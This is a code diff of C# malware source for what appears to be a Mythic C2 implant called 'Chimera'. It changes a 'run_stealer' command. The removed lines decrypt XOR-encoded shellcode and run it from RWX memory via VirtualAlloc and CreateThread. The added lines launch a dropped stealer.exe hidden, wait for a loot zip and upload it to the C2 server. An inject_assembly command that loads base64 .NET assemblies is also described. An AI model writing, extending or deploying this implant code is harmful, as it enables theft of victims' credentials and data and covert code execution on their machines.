@@ -1,37 +1,17 @@
 using System;
+using System.Diagnostics;
 using System.IO;
 using System.Reflection;
-using System.Runtime.InteropServices;
 using System.Threading;
 
 namespace Chimera.Commands
 {
     // inject_assembly <base64_assembly> — load a .NET assembly from base64 and call its Run() method
-    // run_stealer                        — decrypt embedded stealer_enc resource (XOR 0x41),
-    //                                      write to staging dir, allocate RWX, run in thread,
-    //                                      wait for loot zip, upload it
+    // run_stealer                        — launch stealer.exe from staging dir, wait for loot zip, upload it
     public static class InjectAssembly
     {
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern IntPtr VirtualAlloc(
-            IntPtr lpAddress, UIntPtr dwSize,
-            uint flAllocationType, uint flProtect);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern IntPtr CreateThread(
-            IntPtr lpThreadAttributes, UIntPtr dwStackSize,
-            IntPtr lpStartAddress, IntPtr lpParameter,
-            uint dwCreationFlags, out uint lpThreadId);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
-
-        private const uint MEM_COMMIT  = 0x1000;
-        private const uint MEM_RESERVE = 0x2000;
-        private const uint PAGE_EXECUTE_READWRITE = 0x40;
-
-        private static readonly string LootPath  = Path.Combine(Staging.Dir, "stealer_loot.zip");
-        private static readonly string StealerBin = Path.Combine(Staging.Dir, "stealer.bin");
+        private static readonly string LootPath   = Path.Combine(Staging.Dir, "stealer_loot.zip");
+        private static readonly string StealerExe = Path.Combine(Staging.Dir, "stealer.exe");
         private const int PollSec = 120;
 
         public static string Execute(string parameters, string taskID, string callbackUUID)
@@ -90,51 +70,35 @@ namespace Chimera.Commands
         }
 
         // ── run_stealer ───────────────────────────────────────────────────────────
+        // stealer.exe is dropped to Staging.Dir by the DLL before chimera.exe runs.
+        // We simply launch it as a normal process — it writes stealer_loot.zip to
+        // Staging.Dir when done.  No shellcode, no RWX allocation.
         private static string RunStealer(string taskID, string callbackUUID)
         {
             try
             {
                 Staging.EnsureDir();
 
-                // 1. Load embedded resource stealer_enc
-                var thisAsm = Assembly.GetExecutingAssembly();
-                var stream  = thisAsm.GetManifestResourceStream("stealer_enc");
-                if (stream == null)
-                    return "[error] Resource 'stealer_enc' not found in assembly.";
+                if (!File.Exists(StealerExe))
+                    return "[error] stealer.exe not found at " + StealerExe;
 
-                byte[] enc = new byte[stream.Length];
-                stream.Read(enc, 0, enc.Length);
-                stream.Close();
+                // Delete any stale loot zip before we start
+                try { if (File.Exists(LootPath)) File.Delete(LootPath); } catch { }
 
-                // 2. XOR decrypt (key 0x41)
-                byte[] shellcode = new byte[enc.Length];
-                for (int i = 0; i < enc.Length; i++)
-                    shellcode[i] = (byte)(enc[i] ^ 0x41);
+                // Launch stealer.exe hidden, from the staging directory
+                var psi = new ProcessStartInfo(StealerExe)
+                {
+                    WorkingDirectory = Staging.Dir,
+                    UseShellExecute  = false,
+                    CreateNoWindow   = true,
+                    WindowStyle      = ProcessWindowStyle.Hidden
+                };
 
-                // 3. Write decrypted shellcode to staging dir for manual extraction
-                File.WriteAllBytes(StealerBin, shellcode);
+                Process proc = Process.Start(psi);
+                if (proc == null)
+                    return "[error] Failed to start stealer.exe";
 
-                // 4. Allocate RWX memory and copy shellcode in
-                IntPtr mem = VirtualAlloc(
-                    IntPtr.Zero,
-                    (UIntPtr)shellcode.Length,
-                    MEM_COMMIT | MEM_RESERVE,
-                    PAGE_EXECUTE_READWRITE);
-
-                if (mem == IntPtr.Zero)
-                    return "[error] VirtualAlloc failed: " + Marshal.GetLastWin32Error();
-
-                Marshal.Copy(shellcode, 0, mem, shellcode.Length);
-
-                // 5. Create thread
-                uint tid;
-                IntPtr hThread = CreateThread(
-                    IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, out tid);
-
-                if (hThread == IntPtr.Zero)
-                    return "[error] CreateThread failed: " + Marshal.GetLastWin32Error();
-
-                // 6. Poll up to PollSec seconds for loot zip
+                // Poll up to PollSec seconds for loot zip
                 bool found = false;
                 for (int i = 0; i < PollSec; i++)
                 {
@@ -142,19 +106,28 @@ namespace Chimera.Commands
                     if (File.Exists(LootPath)) { found = true; break; }
                 }
 
-                if (!found)
-                    return "[error] Stealer ran but loot zip not found at " + LootPath
-                           + " within " + PollSec + " seconds.";
+                // Wait for the process to exit (give it a little extra time)
+                try { proc.WaitForExit(5000); } catch { }
 
-                // 7. Upload loot
+                if (!found)
+                {
+                    // Try one last time in case it finished right as we stopped polling
+                    if (File.Exists(LootPath))
+                        found = true;
+                    else
+                        return "[error] Stealer ran but loot zip not found at " + LootPath
+                               + " within " + PollSec + " seconds.";
+                }
+
+                // Upload loot to Mythic
                 string uploadResult = Upload.Execute(
                     LootPath + " stealer_loot.zip", taskID, callbackUUID);
 
-                // 8. Clean up loot (keep stealer.bin for manual use)
+                // Clean up zip after upload
                 try { File.Delete(LootPath); } catch { }
 
                 return "[+] Stealer completed.\n" +
-                       "    Shellcode: " + StealerBin + "\n" +
+                       "    Exe: " + StealerExe + "\n" +
                        "    Loot uploaded: " + uploadResult;
             }
             catch (Exception ex)
